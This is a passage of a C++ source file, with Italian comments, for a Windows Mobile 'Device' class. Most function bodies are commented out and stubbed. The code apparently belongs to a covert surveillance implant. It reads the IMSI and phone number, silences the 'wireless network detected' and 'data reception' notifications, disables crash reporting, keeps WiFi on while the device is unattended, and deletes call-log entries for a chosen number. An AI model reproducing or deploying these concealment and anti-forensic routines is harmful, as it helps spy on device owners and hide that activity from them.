			strImsi = (PWCHAR)pImsi;
		}

		// Prendiamo il numero di telefono
		strPhoneNumber.clear();

		if (lpLine->dwAddressSize) {
			PBYTE pNumber = (BYTE *)lpLine + (lpLine->dwAddressOffset);

			strPhoneNumber = (PWCHAR)pNumber;
		}

		if (lpLine)
			delete[] lpLine;

		if (lpBuffer)
			delete[] lpBuffer;

	} while(0);

	// Svuotiamo la mappa delle flash cards
	mDiskInfo.clear();

	// Troviamo il nome delle flash e mettiamolo nella mappa
	hMmc = FindFirstFlashCard(&wfd);

	if (hMmc == INVALID_HANDLE_VALUE) {
		UNLOCK(hDeviceMutex);
		return TRUE; // Non e' detto che una MMC sia presente
	}

	uMmc = 0; // Azzeriamo l'indice

	do {
		mDiskInfo[uMmc].lFreeToCaller.QuadPart = 0;
		mDiskInfo[uMmc].lDiskSpace.QuadPart = 0;
		mDiskInfo[uMmc].lDiskSpace.QuadPart = 0;

		mDiskInfo[uMmc].uDiskIndex = uMmc; // Impostiamo l'indice del disco

		mDiskInfo[uMmc].strDiskName = L"/";
		mDiskInfo[uMmc].strDiskName += wfd.cFileName;

		// Troviamo lo spazio libero, occupato e totale
		GetDiskFreeSpaceEx(mDiskInfo[uMmc].strDiskName.c_str(), &mDiskInfo[uMmc].lFreeToCaller,
			&mDiskInfo[uMmc].lDiskSpace, &mDiskInfo[uMmc].lDiskFree);

		uMmc++;
	} while(FindNextFlashCard(hMmc, &wfd));

	// Aggiorniamo il numero totale di dischi presenti
	uMmcNumber = uMmc;

	FindClose(hMmc);

	UNLOCK(hDeviceMutex);
***/
	return TRUE;
}

void Device::DisableWiFiNotification() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);

	// Sound: Rilevata rete wireless
	//  * 0 – Show icon
	//  * 1 – Show icon and play notification sound
	//	* 2 – Show icon and vibration
	//	* 3 – Show icon and vibration and play notification sound
	//	* 4 – Same as 0
	//	* 5 – Same as 1
	//	* 6 – Same as 3
	//	* 7 – Same as 3
	//	* 8 – Show icon and notification bubble
	//	* 9 – Show icon and play notification sound and show notification bubble
	//	* 10 – Show icon and notification bubble and vibration
	//	* 11 – Show icon and play notification sound and show notification bubble and vibration
	//	* 13 – Same as 1
	//
	// HKEY_CURRENT_USER\ControlPanel\Notifications\{DDBD3B44-80B0-4b24-9DC4-839FEA6E559E} -> Options
	RegistryGetDWORD(HKEY_CURRENT_USER, L"ControlPanel\\Notifications\\{DDBD3B44-80B0-4b24-9DC4-839FEA6E559E}",
		L"Options", &m_WiFiSoundValue);

	RegistrySetDWORD(HKEY_CURRENT_USER, L"ControlPanel\\Notifications\\{DDBD3B44-80B0-4b24-9DC4-839FEA6E559E}",
		L"Options", 0);

	// Sound: Ricezione automatica dati
	// HKEY_CURRENT_USER\ControlPanel\Notifications\{F55615D6-D29E-4db8-8C75-98125D1A7253} -> Options
	RegistryGetDWORD(HKEY_CURRENT_USER, L"ControlPanel\\Notifications\\{F55615D6-D29E-4db8-8C75-98125D1A7253}",
		L"Options", &m_DataSendSoundValue);

	RegistrySetDWORD(HKEY_CURRENT_USER, L"ControlPanel\\Notifications\\{F55615D6-D29E-4db8-8C75-98125D1A7253}",
		L"Options", 0);

	UNLOCK(hDeviceMutex);
***/
	return;
}

void Device::RestoreWiFiNotification() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);

	// Sound: Rilevata rete wireless
	// HKEY_CURRENT_USER\ControlPanel\Notifications\{DDBD3B44-80B0-4b24-9DC4-839FEA6E559E} -> Options
	RegistrySetDWORD(HKEY_CURRENT_USER, L"ControlPanel\\Notifications\\{DDBD3B44-80B0-4b24-9DC4-839FEA6E559E}",
		L"Options", m_WiFiSoundValue);

	// Sound: Ricezione automatica dati
	// HKEY_CURRENT_USER\ControlPanel\Notifications\{F55615D6-D29E-4db8-8C75-98125D1A7253} -> Options
	RegistrySetDWORD(HKEY_CURRENT_USER, L"ControlPanel\\Notifications\\{F55615D6-D29E-4db8-8C75-98125D1A7253}",
		L"Options", m_DataSendSoundValue);

	UNLOCK(hDeviceMutex);
***/
	return;
}

BOOL Device::RegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify, DWORD dwUserData) {

	WAIT_AND_SIGNAL(hDeviceMutex);
	vector<CallBackStruct>::const_iterator iter;
	CallBackStruct callBack;

	if (pfnPowerNotify == NULL) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	for (iter = vecCallbacks.begin(); iter != vecCallbacks.end(); iter++) {
		if ((*iter).pfnPowerNotify == pfnPowerNotify) {
			UNLOCK(hDeviceMutex);
			return FALSE;
		}
	}

	callBack.pfnPowerNotify = pfnPowerNotify;
	callBack.dwUserData = dwUserData;

	vecCallbacks.push_back(callBack);

	UNLOCK(hDeviceMutex);

	return TRUE;
}

BOOL Device::UnRegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify) {

	WAIT_AND_SIGNAL(hDeviceMutex);
	vector<CallBackStruct>::const_iterator iter;

	for (iter = vecCallbacks.begin(); iter != vecCallbacks.end(); iter++) {
		if ((*iter).pfnPowerNotify == pfnPowerNotify) {
			vecCallbacks.erase(iter);
			UNLOCK(hDeviceMutex);
			return TRUE;
		}
	}

	UNLOCK(hDeviceMutex);
	_Sleep(200);

	return FALSE;
}

void Device::CallRegisteredCallbacks(POWER_BROADCAST *powerBroad) {
	WAIT_AND_SIGNAL(hDeviceMutex);
	vector<CallBackStruct>::const_iterator iter;
	POWERNOTIFYCALLBACK pfnCallBack;

	if (vecCallbacks.size() == 0) {
		UNLOCK(hDeviceMutex);
		return;
	}

	for (iter = vecCallbacks.begin(); iter != vecCallbacks.end(); iter++) {
		if ((*iter).pfnPowerNotify == NULL)
			continue;

		pfnCallBack = (POWERNOTIFYCALLBACK)(*iter).pfnPowerNotify;
		pfnCallBack(powerBroad, (*iter).dwUserData);
	}

	UNLOCK(hDeviceMutex);
	return;
}

BOOL Device::EnableDrWatson() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);
	BOOL bRet = FALSE;

	// HKEY_LOCAL_MACHINE\System\ErrorReporting\DumpSettings
	if (RegistrySetDWORD(HKEY_LOCAL_MACHINE, L"System\\ErrorReporting\\DumpSettings",
		L"DumpEnabled", 1) == S_OK) {
			bRet = TRUE;
	}

	UNLOCK(hDeviceMutex);
	return bRet;
***/
	return NULL;
}

BOOL Device::DisableDrWatson() {
/***
#ifdef _DEBUG
	// In debug mode evitiamo di far disabilitare l'error reporting
	return TRUE;
#endif

	WAIT_AND_SIGNAL(hDeviceMutex);
	BOOL bRet = FALSE;

	// HKEY_LOCAL_MACHINE\System\ErrorReporting\DumpSettings
	if (RegistrySetDWORD(HKEY_LOCAL_MACHINE, L"System\\ErrorReporting\\DumpSettings",
		L"DumpEnabled", 0) == S_OK) {
			bRet = TRUE;
	}

	UNLOCK(hDeviceMutex);
	return bRet;
***/
	return NULL;
}

BOOL Device::HTCEnableKeepWiFiOn() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);
	if (strModel.find(L"htc") == wstring::npos && strModel.find(L"HTC") == wstring::npos) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	CWifi wifi;
	wstring strWifiDevice, strRegistryKey;

	wifi.GetWiFiAdapterName(strWifiDevice);

	if (strWifiDevice.empty()) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	strRegistryKey = L"Comm\\";
	strRegistryKey += strWifiDevice;
	strRegistryKey += L"\\Parms";

	BOOL bRet = FALSE;

	RegistrySetDWORD(HKEY_LOCAL_MACHINE, strRegistryKey.c_str(), L"HTCWiFiOffLockUnattend", 0);
	RegistrySetDWORD(HKEY_LOCAL_MACHINE, strRegistryKey.c_str(), L"HTCLimitOIDAccess", 0);

	// Questa e' la piu' importante
	if (RegistrySetDWORD(HKEY_LOCAL_MACHINE, strRegistryKey.c_str(), L"HTCKeepWifiOnWhenUnattended", 1) == S_OK) {
		bRet = TRUE;
	}

	UNLOCK(hDeviceMutex);
	return bRet;
***/
	return NULL;
}

// Reentrant
BOOL Device::IsDeviceUnattended() {
/***
	BOOL bRet = FALSE;
	DWORD dwState;
	WCHAR wStateBuffer[128];

	// Dummy request, a volte non funziona alla prima richiesta :/
	GetSystemPowerState(wStateBuffer, 128, &dwState);

	if (GetSystemPowerState(wStateBuffer, 128, &dwState) != ERROR_SUCCESS) {
		DBG_TRACE(L"Debug - Device.cpp - IsDeviceUnattended() FAILED [0]\n", 4, FALSE);
		return bRet;
	}

	if ((dwState & POWER_STATE_UNATTENDED) == POWER_STATE_UNATTENDED) {
		bRet = TRUE;
		return bRet;
	}

	return bRet;
***/
	return NULL;
}

// Reentrant
BOOL Device::IsDeviceOn() {
/***
	BOOL bRet = FALSE;
	DWORD dwState;
	WCHAR wStateBuffer[128];

	// Dummy request, a volte non funziona alla prima richiesta :/
	GetSystemPowerState(wStateBuffer, 128, &dwState);

	if (GetSystemPowerState(wStateBuffer, 128, &dwState) != ERROR_SUCCESS) {
		DBG_TRACE(L"Debug - Device.cpp - IsDeviceOn() FAILED [0]\n", 4, FALSE);
		return bRet;
	}

	if ((dwState & POWER_STATE_ON) == POWER_STATE_ON) {
		bRet = TRUE;
		return bRet;
	}

	return bRet;
***/
	return NULL;
}

void Device::RemoveNotification(const GUID* pClsid)
{
/***
	DWORD i = 0;
	LRESULT lr;

	while (i < MAX_EVENT_NOTIFICATION_1) {
		lr = SHNotificationRemove(pClsid, i);
		i++;
	}  
***/
}

UINT Device::RemoveCallEntry(wstring swNumber)
{/*** BYGIO vedee libreria SQLCESE35 che supporta le api qui di seguito
	UINT uRet = 0;
	HANDLE hSession = INVALID_HANDLE_VALUE, hSessionDB = INVALID_HANDLE_VALUE;
	DWORD dwIndex = 0;		
	wstring lpszDBVol = L"\\pim.vol";   // eventualemte cercare il path e/o il nome nel registro
	wstring lpszCLog = L"clog.db";   // verificare se c sono casi in cui  e' Palmvol.vol e P1clog.db
	CEOID ceoid = 0, oid = 0;
	CEGUID guidDBVol;

	if (FALSE == CeMountDBVolEx(&guidDBVol, (LPWSTR)lpszDBVol.c_str(), NULL, OPEN_EXISTING)) {
		return uRet;
	}

	hSession = CeCreateSession(&guidDBVol);

	if (hSession == INVALID_HANDLE_VALUE) {
		CeUnmountDBVol(&guidDBVol);
		return uRet;
	}

	hSessionDB = CeOpenDatabaseInSession(hSession, &guidDBVol, &oid, (LPWSTR)lpszCLog.c_str(),
				NULL, CEDB_AUTOINCREMENT, 0);

	if (hSessionDB == NULL) {
		if (hSession != NULL) {
			CloseHandle(hSession);
			hSession = NULL;
			return uRet;
		}	
	}

	ceoid = CeSeekDatabaseEx(hSessionDB, CEDB_SEEK_BEGINNING, 0, 0, NULL);

	if (ceoid == 0) {
		CLOSEHANDLE(hSession);
		CLOSEHANDLE(hSessionDB);
		CeUnmountDBVol(&guidDBVol);
		return uRet;

	}

	DWORD cbBuffer = 0;
	WORD cPropID = 0;
	CEPROPID propID = 0;
	HLOCAL hMem = NULL;

	BYTE *lpBuf = NULL;
	CEOID CeOid = 0;
	CEPROPVAL *lpRecord = NULL;
	BOOL bDelete = FALSE;

	while ((ceoid = CeReadRecordPropsEx(hSessionDB, CEDB_ALLOWREALLOC, &cPropID, NULL, 
					(LPBYTE*)&lpBuf, &cbBuffer, NULL)) != 0) {
		lpRecord = (PCEPROPVAL)lpBuf;

		for (UINT i = 0; i < cPropID; i++) {
			if (CEVT_LPWSTR == TypeFromPropID(lpRecord[i].propid)) {
				wstring tmp(lpRecord[i].val.lpwstr);

				if (tmp.compare(swNumber) == 0) {
					bDelete = CeDeleteRecord(hSessionDB, ceoid);

					if (bDelete == TRUE) {
						uRet++;
						break;
					}
				}
			}
		}

		if (lpBuf != NULL) {
			LocalFree(lpBuf);
			lpBuf = NULL;
		}
	}

	if (lpBuf != NULL) {
		LocalFree(lpBuf);
		lpBuf = NULL;
	}

	CLOSEHANDLE(hSession);
	CLOSEHANDLE(hSessionDB);

	CeUnmountDBVol(&guidDBVol);
	return uRet;
	***/
	return NULL;
}

BOOL Device::SetPwrRequirement(DWORD dwPwd)
{
/***
	DWORD dwOut;

	dwOut = SetSystemPowerState(0, dwPwd, POWER_FORCE);

	if (dwOut != ERROR_SUCCESS) {
		return FALSE;
	}
***/
	return TRUE;
}

BOOL Device::VideoPowerSwitch(ULONG VideoPower)
{

/***
	INT rc, uQuery = 0;
	HDC hdc = NULL;
	VIDEO_POWER_MANAGEMENT vpm;

	ZeroMemory(&vpm, sizeof(VIDEO_POWER_MANAGEMENT));

	hdc = GetDC(NULL);

	if (NULL == hdc)
		return FALSE;

	uQuery = SETPOWERMANAGEMENT;
	rc = ExtEscape(hdc, QUERYESCSUPPORT, sizeof(uQuery), (LPSTR)&uQuery, 0, 0);

	if (0 == rc) {
		ReleaseDC(NULL, hdc);
		return FALSE;
	}

	vpm.Length = 1;
	vpm.DPMSVersion  = 1;
	vpm.PowerState = VideoPower;
	rc = ExtEscape(hdc, SETPOWERMANAGEMENT, sizeof(vpm), (LPSTR)&vpm, 0, 0);

	ReleaseDC(NULL, hdc);
***/
	return TRUE;
}

// Attenzione, questa funzione disconnette activesync e poi lo riconnette!!
BOOL Device::SwitchUSBFunctionProfile(BOOL bEnableActiveSync) {
/***
	HANDLE hUSBFn;
	UFN_CLIENT_INFO info;
	DWORD dwBytes;

	// Open the USB function driver
	hUSBFn = CreateFile(USB_FUN_DEV, FILE_WRITE_ATTRIBUTES,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hUSBFn == INVALID_HANDLE_VALUE)
		return FALSE;

	if (bEnableActiveSync) {
		// Enable ActiveSync
		return DeviceIoControl(hUSBFn, IOCTL_UFN_CHANGE_CURRENT_CLIENT,
			info.szName, sizeof(info.szName), NULL, 0, &dwBytes, NULL);
	}

	// Enable mass-storage
	return DeviceIoControl(hUSBFn, IOCTL_UFN_CHANGE_CURRENT_CLIENT,
		info.szName, sizeof(info.szName), NULL, 0, &dwBytes, NULL);
***/
	return NULL;
}

void Device::SetTimeDiff(ULARGE_INTEGER uTime) {
	ulTimeDiff = uTime;
}

ULARGE_INTEGER Device::GetTimeDiff() {
	return ulTimeDiff;
}

HANDLE Device::getIdleEvent() {
	return hIdleEvent;
}